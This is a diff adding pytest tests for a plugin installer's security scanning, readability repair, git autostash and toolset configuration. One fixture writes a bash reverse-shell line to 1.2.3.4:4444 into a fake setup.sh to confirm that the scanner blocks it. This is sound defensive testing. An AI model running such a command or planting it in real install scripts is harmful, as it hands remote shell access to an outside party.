@@ -798,6 +798,94 @@ class TestSubdirInstallE2E:
         assert pc._resolve_plugin_key("portable.test") == "portable.test"
 
 
+class TestReviewedPinScanTrust:
+    """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
+    prompts/blocks as a raw source or at a different revision, and dangerous blocks regardless."""
+
+    SHA = "a" * 40
+
+    def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / extra_file).write_text(body, encoding="utf-8")
+            return revision or "b" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+
+    def test_caution_trusted_only_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False)
+        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
+        target, _manifest, name = pc._install_plugin_core(
+            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+        assert name == "scanme" and target.is_dir()
+
+    def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+
+
+class TestInstallReadabilityGate:
+    """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""
+
+    def _clone_with_unreadable_manifest(self, monkeypatch, pc):
+        real_chmod = os.chmod  # the rollback test replaces os.chmod after this fixture runs
+
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: badperm\nmanifest_version: 1\n", encoding="utf-8")
+            real_chmod(tmp_clone / "plugin.yaml", 0)
+            return "0" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_scan_plugin_tree", lambda *a, **k: None)
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unreadable_file_is_repaired_before_install(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+
+        target, manifest, name = pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert name == "badperm"  # manifest read after repair, not the URL fallback
+        assert (target / "plugin.yaml").read_text(encoding="utf-8").startswith("name: badperm")
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unrepairable_tree_rolls_back_and_names_the_fix(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+        monkeypatch.setattr(pc.os, "chmod", lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")))
+
+        with pytest.raises(PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"):
+            pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert list(plugins_dir.iterdir()) == []  # no half-installed dir, no staging leftovers
+
+
 def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
     import json
 
@@ -823,3 +911,60 @@ def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
         "Portable test plugin",
         "portable.test",
     )
+
+
+def test_autostash_dirty_tree_promotes_intent_to_add_entries(tmp_path):
+    """A plugin checkout holding `git add -N` entries must still autostash.
+
+    Same class as the `hermes update` autostash: an intent-to-add entry is never "uptodate", so
+    `git stash push` refuses it. A plugin install is patched in place often enough that this state is
+    ordinary rather than exotic, and the failure would abort the plugin update with a confusing error.
+    """
+    import subprocess
+
+    from hermes_cli.plugins_cmd import _autostash_dirty_tree
+
+    def git(*args, check=True):
+        return subprocess.run(
+            ["git", *args], cwd=tmp_path, capture_output=True, text=True, check=check
+        )
+
+    git("init", "-q", "-b", "main")
+    git("config", "user.email", "t@example.com")
+    git("config", "user.name", "t")
+    (tmp_path / "README.md").write_text("plugin\n", encoding="utf-8")
+    git("add", "-A")
+    git("commit", "-qm", "init")
+
+    local = tmp_path / "local_patch.py"
+    local.write_text("PATCHED = True\n", encoding="utf-8")
+    git("add", "-N", "local_patch.py")
+    assert " A local_patch.py" in git("status", "--porcelain").stdout.splitlines()
+
+    stashed, error = _autostash_dirty_tree("git", tmp_path)
+
+    assert (stashed, error) == (True, ""), "the plugin autostash must not be blocked by i-t-a entries"
+    assert git("status", "--porcelain").stdout == ""
+
+
+def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(tmp_path, monkeypatch):
+    """``hermes plugins enable`` must reach a platform whose ``platform_toolsets`` entry is the
+    list-literal string an older ``hermes config set`` stored, and re-save it as a real list —
+    the runtime already reads that string as the user's selection (follow-up to #115866)."""
+
+    from hermes_cli import plugins_cmd
+
+    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+    (tmp_path / "config.yaml").write_text(
+        yaml.safe_dump({"platform_toolsets": {"cli": '["web", "terminal"]', "telegram": ["hermes-telegram"]}}),
+        encoding="utf-8")
+    monkeypatch.setattr(plugins_cmd, "_get_plugin_toolset_key", lambda name: "my-plugin")
+
+    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=True)
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    assert saved["cli"] == ["web", "terminal", "my-plugin"]
+    assert saved["telegram"] == ["hermes-telegram", "my-plugin"]
+
+    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=False)
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    assert saved["cli"] == ["web", "terminal"]
